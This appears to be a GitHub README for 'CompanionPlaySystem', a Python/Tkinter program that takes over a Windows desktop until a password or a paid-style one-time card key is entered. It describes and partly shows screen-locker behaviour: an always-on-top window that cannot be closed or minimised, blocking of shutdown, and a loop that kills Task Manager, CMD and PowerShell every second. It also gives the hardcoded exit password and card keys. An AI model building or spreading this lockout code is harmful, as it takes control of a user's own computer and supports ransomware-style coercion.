# CompanionPlaySystem

A desktop application with retro style, providing forced companion play functionality and multiple security protection mechanisms.

## Project Description

This is a desktop application developed using Python and Tkinter, featuring:
- Retro-style UI interface design
- Forced companion play mechanism
- Multiple security protections (prevent closing, prevent minimizing, prevent task manager)
- Dual unlock system with password and card keys
- Device binding mechanism

## Features

### 🎨 Retro Interface
- Classic Windows 95/98 style color scheme
- Gray background with dark blue text
- 3D border effects
- Traditional button styles

### 🔒 Security Protection
- Window always on top
- Minimization disabled
- Monitors and closes Task Manager, CMD, PowerShell
- Prevents system shutdown

### 🔑 Unlock System
- **Password Unlock**: Exit with preset password
- **Card Key Unlock**: Supports multiple one-time card keys
- **Device Binding**: Card keys bound to device ID to prevent reuse

## Tech Stack

```python
import tkinter as tk
import psutil
import ctypes
import hashlib
import json
import threading
```

## File Structure

```
CompanionPlaySystem/
├── CompanionPlaySystem_RetroVersion.py  # Retro version main program
├── CompanionPlaySystem(1.3.5).py        # Standard version main program  
└── used_keys.json                       # Card key usage records (generated at runtime)
```

## Installation Requirements

```bash
pip install psutil
```

## Usage Instructions

### Launch Program
```cmd
python CompanionPlaySystem_RetroVersion.py
```
```cmd
python CompanionPlaySystem(1.3.5).py
```

### Operation Flow
1. Read and agree to the user agreement
2. Check the agreement checkbox
3. Click the "Play Now" button
4. Follow prompts to complete the companion play process

### Exit Methods
- **Password Exit**: Enter the preset password
- **Card Key Unlock**: Use a valid card key for temporary unlock

## Code Examples

### Main Window Initialization
```python
class AntiCloseApp:
    def __init__(self, root):
        self.root = root
        self.root.title(WINDOW_TITLE) 
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        # Set window properties...
```

### Device ID Acquisition
```python
def get_device_id():
    try:
        volume_info = subprocess.check_output("wmic diskdrive get serialnumber", shell=True)
        serial_numbers = volume_info.decode().split('\n')[1:]
        serial_number = ''.join(serial_numbers).strip()
        return hashlib.md5(serial_number.encode()).hexdigest()
    except:
        return "default_device_id"
```

### System Monitoring
```python
def monitor_system(self):
    while True:
        # Check for Task Manager, CMD, and PowerShell
        for proc in psutil.process_iter(['name']): 
            proc_name = proc.info['name'].lower() if proc.info['name'] else ''
            if proc_name in ['taskmgr.exe', 'cmd.exe', 'powershell.exe']: 
                try:
                    proc.kill() 
                except:
                    pass
        time.sleep(1)
```

## Configuration Parameters

### Initial Settings
```python
PASSWORD = "2002"  # Default exit password
CARD_KEYS = ["kdys-swax-458d", "plhz-nkcy-381s"]  # Available card key list
WINDOW_TITLE = "都不陪的！！！"  # Window title
```

### Retro Color Scheme
```python
BG_COLOR = "#c0c0c0"        # Classic gray background
BUTTON_COLOR = "#d4d0c8"    # Retro button color  
TEXT_COLOR = "#000080"      # Dark blue text
ACCENT_COLOR = "#800000"    # Dark red accent color
BORDER_STYLE = "groove"     # Retro border style
```

## Version History

### v1.3.5
- Basic functionality implementation
- Password and card key unlock system
- System process monitoring

### Retro Version
- Retro UI design
- Enhanced window management
- Improved device binding mechanism

## Important Notes

⚠️ **Important Reminders**
- This program has forced execution characteristics
- Keep the exit password secure
- Card keys are for one-time use, choose carefully
- Program monitors system processes during operation

## License

© 2025 yanodaPro and Beautifulday For learning and communication purposes only

---

*Note: This project is for demonstration purposes only. Please comply with relevant laws and regulations.*
```